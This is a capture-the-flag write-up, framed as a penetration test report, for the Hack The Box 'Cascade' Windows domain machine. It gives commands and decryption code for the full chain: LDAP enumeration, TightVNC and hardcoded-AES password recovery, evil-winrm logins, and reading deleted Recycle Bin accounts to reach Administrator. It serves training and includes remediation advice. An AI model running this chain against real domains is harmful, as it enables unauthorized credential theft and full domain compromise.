# Penetration Test Report — Cascade

![Difficulty](https://img.shields.io/badge/difficulty-Medium-orange) ![OS](https://img.shields.io/badge/OS-Windows%20AD-blue) ![Focus](https://img.shields.io/badge/focus-LDAP%20%2F%20.NET%20RE%20%2F%20AD%20Recycle%20Bin-red)

## Executive Summary

An authorized assessment of `target.htb` (Domain Controller, `cascade.local`) chained credential exposures across four accounts. Anonymous LDAP binds leaked a Base64 password for `r.thompson`; SMB access to a registry backup yielded a decryptable TightVNC password for `s.smith`; decompiling a .NET audit tool revealed the AES key protecting the `ArkSvc` password in a SQLite database; and `ArkSvc`'s membership in the AD Recycle Bin group exposed a deleted account whose `cascadeLegacyPwd` matched the domain Administrator password — full domain compromise.

## Findings Overview

| # | Finding | Severity |
|---|---|---|
| 1 | Anonymous LDAP binds exposing `cascadeLegacyPwd` attribute | High |
| 2 | TightVNC registry backup with statically decryptable password | High |
| 3 | Hardcoded AES key/IV in .NET assembly protecting service credentials | High |
| 4 | Deleted-account credentials retained in AD Recycle Bin + password reuse with Administrator | Critical |

## Technical Walkthrough

### 1. Enumeration

```bash
ports=$(nmap -Pn -p- --min-rate=1000 -T4 target.htb | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -Pn -sC -sV target.htb
```

LDAP (389), SMB (445), WinRM (5985). Anonymous LDAP enumeration with windapsearch:

```bash
git clone https://github.com/ropnop/windapsearch.git
./windapsearch.py -U --full --dc-ip target.htb
```

User `r.thompson` had a `cascadeLegacyPwd` attribute — Base64-decoding revealed `rY4n5eva`.

### 2. SMB Reconnaissance as r.thompson

```bash
smbmap -H target.htb -u r.thompson -p 'rY4n5eva'
smbclient \\\\target.htb\\Data -U r.thompson
```

In the `Data` share:

- `Email Archives\Meeting_Notes_June_2018.html` — mentions a **TempAdmin** account sharing the normal admin password.
- `Logs\ArkAdRecycleBin.log` — ARK AD Recycle Bin runs as `CASCADE\ArkSvc`; TempAdmin was moved to the recycle bin.
- `Temp\s.smith\VNC Install.reg` — TightVNC registry backup containing `"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f`.

### 3. Foothold — TightVNC Decryption

TightVNC passwords use a known hardcoded DES key; decrypted via Metasploit's IRB:

```ruby
key = "\x17\x52\x6b\x06\x23\x4e\x58\x07"
require 'rex/proto/rfb'
Rex::Proto::RFB::Cipher.decrypt ["6BCF2A4B6E5ACA0F"].pack('H*'), key
# => sT333ve2
```

`s.smith` was in Remote Management Users:

```bash
evil-winrm -i target.htb -u s.smith -p sT333ve2
```

User flag: `C:\Users\s.smith\Desktop`.

### 4. Lateral Movement — Decompiling CascAudit

`s.smith`'s logon script (`NETLOGON\MapAuditDrive.vbs`) mapped the hidden `Audit$` share. Inside: `CascAudit.exe` and `DB\Audit.db` (SQLite) holding an encrypted `ArkSvc` password.

Decompiling `CascAudit.exe` and `CascCrypto.dll` with dnSpy revealed AES-128-CBC with hardcoded key `c4scadek3y654321` and IV `1tdyjCbY1Ix49842`:

```python
import pyaes
from base64 import b64decode
aes = pyaes.AESModeOfOperationCBC(b"c4scadek3y654321", iv=b"1tdyjCbY1Ix49842")
print(aes.decrypt(b64decode('BQO5l5Kj9MdErXx6Q6AGOw==')).decode())
# => w3lc0meFr31nd
```

```bash
evil-winrm -i target.htb -u ArkSvc -p w3lc0meFr31nd
```

### 5. Privilege Escalation — AD Recycle Bin

`ArkSvc` belongs to the **AD Recycle Bin** group and can read deleted objects:

```powershell
Get-ADObject -ldapfilter "(&(objectclass=user)(DisplayName=TempAdmin)(isDeleted=TRUE))" -IncludeDeletedObjects -Properties *
```

TempAdmin's `cascadeLegacyPwd` decoded to `baCT3r1aN00dles`. Per the archived email, TempAdmin shares the **Administrator** password:

```bash
evil-winrm -i target.htb -u Administrator -p baCT3r1aN00dles
```

Root flag obtained.

## Remediation

- Disable anonymous LDAP binds; remove legacy password attributes from schema usage.
- Never distribute VNC/registry backups containing credentials on shares.
- Eliminate hardcoded crypto keys; use DPAPI or a secrets vault for stored credentials.
- Purge sensitive attributes on account deletion; monitor AD Recycle Bin access; enforce unique admin passwords.

## MITRE ATT&CK Mapping

| Tactic | Technique |
|---|---|
| Credential Access | T1552 — Unsecured Credentials (LDAP attr, registry, binary) |
| Discovery | T1087.002 — Domain Account enumeration |
| Lateral Movement | T1021.006 — WinRM |
| Privilege Escalation | T1078 — Valid Accounts (recovered deleted creds) |

---
*Assessment performed in an authorized lab environment (Hack The Box).*
